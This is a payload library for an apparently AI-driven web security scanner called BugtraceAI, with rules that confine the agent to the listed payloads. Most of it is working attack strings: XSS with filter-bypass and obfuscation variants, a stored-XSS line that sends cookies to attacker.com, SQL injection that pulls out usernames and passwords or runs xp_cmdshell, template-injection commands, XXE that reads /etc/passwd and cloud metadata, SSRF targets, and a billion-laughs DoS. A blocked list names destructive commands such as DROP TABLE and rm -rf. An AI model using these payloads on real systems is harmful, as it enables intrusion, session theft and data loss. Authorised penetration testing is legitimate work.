# Curated Payload Library - VETTED ONLY
## BugtraceAI Expert-Grade Security Testing Payloads

**Version**: 2.0  
**Last Updated**: 2026-01-01  
**Usage**: MANDATORY - Only use payloads from this library

---

## ⚠️ USAGE RULES

### CRITICAL GUIDELINES:

1. **ONLY use payloads from this library**
   - Exception: Validated mutations from Mutation Engine
   - All other payloads MUST be approved by user

2. **If you need a new payload**:
   - Log request: `logger.info(f"Requesting new payload for: {context}")`
   - Use closest similar payload from library
   - Submit for library inclusion after manual validation

3. **NEVER generate payloads on-the-fly**:
   - LLM-generated payloads are PROHIBITED
   - Random fuzzing is PROHIBITED
   - Only library + validated mutations

4. **Mutation Engine Rules**:
   - Can modify these payloads
   - MUST validate output (syntax, proof element, length)
   - MUST log: `logger.info(f"Mutation: {original} → {mutated}")`

---

## 🚨 XSS PAYLOADS

### Context-Aware Proofs (REQUIRED: Use `document.domain` or `origin`)

**Why `document.domain`?**
- Proves non-sandboxed execution
- Shows actual target domain (not `null` or `sandbox`)
- Expert-grade evidence

#### Basic Proofs (HTML Context)
```html
<!-- Primary: document.domain -->
<script>alert(document.domain)</script>

<!-- Alternative: origin (modern browsers) -->
<script>alert(origin)</script>

<!-- With confirmation payload -->
<script>alert('XSS at: ' + document.domain)</script>

<!-- Event handler -->
<img src=x onerror=alert(document.domain)>

<!-- SVG vector -->
<svg onload=alert(document.domain)>

<!-- Body event -->
<body onload=alert(document.domain)>
```

#### DOM XSS Specific
```html
<!-- Location-based -->
<script>eval(location.hash.slice(1))</script>

<!-- With URI decode -->
<img src=x onerror=eval(decodeURIComponent(location.hash))>

<!-- innerHTML sink -->
<div id=x></div><script>document.getElementById('x').innerHTML=location.hash.slice(1)</script>

<!-- document.write sink -->
<script>document.write('<img src=x onerror=alert(document.domain)>')</script>
```

#### Reflected XSS (Breaking Out of Contexts)
```html
<!-- Break out of input value -->
"><script>alert(document.domain)</script>

<!-- Break out of textarea -->
</textarea><script>alert(document.domain)</script>

<!-- Break out of single-quoted attribute -->
' onclick=alert(document.domain) x='

<!-- Break out of double-quoted attribute -->
" onclick=alert(document.domain) x="

<!-- Break out of JavaScript string -->
'; alert(document.domain); //

<!-- Break out of template literal -->
${alert(document.domain)}
```

#### Stored XSS (Persistent)
```html
<!-- Standard payload -->
<script>alert('Stored XSS at: ' + document.domain)</script>

<!-- With unique identifier for tracking -->
<script>alert('XSS-ID-12345: ' + document.domain)</script>

<!-- Event-based (survives sanitization sometimes) -->
<img src=x onerror=fetch('https://attacker.com/?cookie='+document.cookie)>
```

### WAF Bypass Payloads (Curated)

**Encoding Techniques**:
```html
<!-- Base64 encoding -->
<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>
<!-- Decoded: alert(document.domain) -->

<!-- Unicode escapes -->
<script>\u0061lert(document.domain)</script>

<!-- HTML entities -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(document.domain)>

<!-- Mixed case (bypasses simple filters) -->
<ScRiPt>alert(document.domain)</ScRiPt>

<!-- Null bytes (some parsers) -->
<script>alert(document.domain)</script>
```

**Obfuscation Techniques**:
```html
<!-- String concatenation -->
<script>alert(document['domain'])</script>
<script>alert(document['do'+'main'])</script>

<!-- Template literals -->
<script>alert(`${document.domain}`)</script>

<!-- With comments -->
<script>/**/alert/**/(/XSS/.source/**/+document.domain)</script>

<!-- Hex escapes -->
<script>\x61lert(document.domain)</script>
```

**Alternative Event Handlers** (when onclick blocked):
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<body onpageshow=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<marquee onstart=alert(document.domain)>
<div onmouseover=alert(document.domain)>
```

---

## 💉 SQL INJECTION PAYLOADS

### Error-Based Detection

**MySQL**:
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x23,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--


' AND 1=CAST((SELECT version()) AS int)--

' OR '1'='1

" OR "1"="1

' AND EXTRACTVALUE(1,CONCAT(0x5c,version()))--
```

**PostgreSQL**:
```sql
' AND 1=CAST((SELECT version()) AS int)--

' OR '1'='1'--

' AND 1::int=1::int--

' UNION SELECT NULL,version()--
```

**MSSQL**:
```sql
' AND 1=CONVERT(int,(SELECT @@version))--

' OR '1'='1'--

' AND 1=CAST((SELECT @@version) AS int)--

'; EXEC xp_cmdshell('whoami')--
```

**Oracle**:
```sql
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT version FROM v$instance))--

' OR '1'='1'--

' AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE ROWNUM=1))--
```

### Time-Based Detection (Blind SQLi)

**MySQL**:
```sql
' AND SLEEP(5)--

' AND BENCHMARK(10000000,MD5('A'))--

' OR SLEEP(5)--

'; SELECT SLEEP(5)--

' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**PostgreSQL**:
```sql
'; SELECT pg_sleep(5)--

' AND 1=(SELECT 1 FROM pg_sleep(5))--

' OR pg_sleep(5) IS NULL--
```

**MSSQL**:
```sql
'; WAITFOR DELAY '00:00:05'--

' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5)--

'; IF (1=1) WAITFOR DELAY '00:00:05'--
```

**Oracle**:
```sql
' AND DBMS_LOCK.SLEEP(5) IS NULL--

' OR DBMS_LOCK.SLEEP(5) IS NULL--

'; BEGIN DBMS_LOCK.SLEEP(5); END;--
```

### Union-Based Enumeration

**Column Count Discovery**:
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

**Data Extraction** (MySQL):
```sql
' UNION SELECT 1,2,3,4,5,6,7,8--
' UNION SELECT NULL,version(),database(),user(),NULL--
' UNION SELECT NULL,table_name FROM information_schema.tables--
' UNION SELECT NULL,column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,CONCAT( username,0x3a,password) FROM users--
```

### Boolean-Based Detection

**True/False Comparison**:
```sql
' AND '1'='1
' AND '1'='2

' OR 1=1--
' OR 1=2--

' AND (SELECT COUNT(*) FROM users) > 0--
' AND (SELECT COUNT(*) FROM users) > 999999--

' AND SUBSTRING(version(),1,1)='5'--
' AND SUBSTRING(version(),1,1)='4'--
```

---

## 🔥 CLIENT-SIDE TEMPLATE INJECTION (CSTI)

### Jinja2 (Python/Flask)
```python
{{7*7}}  # Should output: 49
{{config}}  # Exposes Flask config
{{''.__class__.__mro__[1].__subclasses__()}}  # RCE attempt
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP/Symfony)
```php
{{7*7}}  # Should output: 49
{{_self.env.display("Template content")}}
{{_self.env.getLoader().getSourceContext('index.html').getCode()}}
```

### Smarty (PHP)
```php
{$smarty.version}
{php}echo `id`;{/php}
{literal}{/literal}
```

### AngularJS (Legacy)
```javascript
{{7*7}}  # Should output: 49
{{constructor.constructor('alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a"].sort(toString.constructor("alert(1)"))}}
```

### Vue.js
```javascript
{{constructor.constructor('alert(1)')()}}
{{_c.constructor('alert(1)')()}}
```

---

## 📄 XXE (XML External Entity)

### File Disclosure
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

### Billion Laughs (DoS)
```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>
```

---

## 🌐 SSRF (Server-Side Request Forgery)

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/metadata/v1/
```

### Localhost Bypass
```
http://localhost:80
http://127.0.0.1:80
http://[::1]:80
http://0.0.0.0:80
http://127.1:80
```

---

## 🚫 INVALID PAYLOADS (NEVER USE)

**These are BLOCKED and will cause validation failures**:

### Common Mistakes:
❌ `<scirpt>alert(1)</scirpt>` - Typo  
❌ `alert(1)` - No proof of origin  
❌ `<script>alert('XSS')</script>` - Generic, no domain proof  
❌ `' OR 1=1--` - Without context/testing  
❌ `{{payload}}` - Generic, no actual template syntax  
❌ `<?php echo "test"; ?>` - Wrong vulnerability type  

### LLM Hallucinations:
❌ `"Here is a payload you could try..."`  
❌ `"This might work: <script>..."`  
❌ `"Consider testing with: ..."`  
❌ Random gibberish from LLM  

### Dangerous/Destructive:
❌ `'; DROP TABLE users--` - Destructive  
❌ `'; DELETE FROM users--` - Destructive  
❌ `<?php system('rm -rf /'); ?>` - Malicious  

---

## 🔧 MUTATION ENGINE VALIDATION

**After Mutation Engine generates a variant, validate**:

### Syntax Check
```python
def validate_mutation(original, mutated, vuln_type):
    if vuln_type == "XSS":
        # Must contain attack chars
        if not any(c in mutated for c in '<>\'"();'):
            return False
        # Must contain proof element
        if 'document.domain' not in mutated and 'origin' not in mutated:
            return False
        # Must be valid HTML/JS
        if '<scirpt>' in mutated or '</scirpt>' in mutated:
            return False
    
    elif vuln_type == "SQLi":
        # Must contain SQL keywords
        if not any(kw in mutated.upper() for kw in ['SELECT', 'UNION', 'AND', 'OR', 'SLEEP']):
            return False
        # Must have quote or comment
        if not any(c in mutated for c in '\'"--#'):
            return False
    
    # Check length
    if len(mutated) > 500:
        return False
    
    # Check for conversational text
    conversational = ['here is', 'try this', 'you could', 'might work']
    if any(phrase in mutated.lower() for phrase in conversational):
        return False
    
    return True
```

---

## 📊 PAYLOAD EFFECTIVENESS TRACKING

**Log all successful exploits for library improvement**:

```python
# When payload succeeds
logger.info(f"SUCCESSFUL_PAYLOAD: {payload}")
logger.info(f"Target: {url}, Vuln: {vuln_type}, Confidence: {confidence}")

# When payload fails
logger.debug(f"FAILED_PAYLOAD: {payload}")
logger.debug(f"Reason: {failure_reason}")
```

---

## 📚 REFERENCES

**Payload Sources** (for library maintenance):
- OWASP Testing Guide
- PortSwigger Web Security Academy
- PayloadsAllTheThings (GitHub)
- HackTricks
- Manual pentesting experience

**DO NOT** source payloads from:
- Random blogs without verification
- ChatGPT/LLM generation
- Untested fuzzing lists
- Stack Overflow without validation

---

**Last Updated**: 2026-01-01 22:10  
**Total Payloads**: 100+  
**Validation**: Mandatory via Conductor V2  
**Version**: 2.0 (Anti-Hallucination Enhanced)
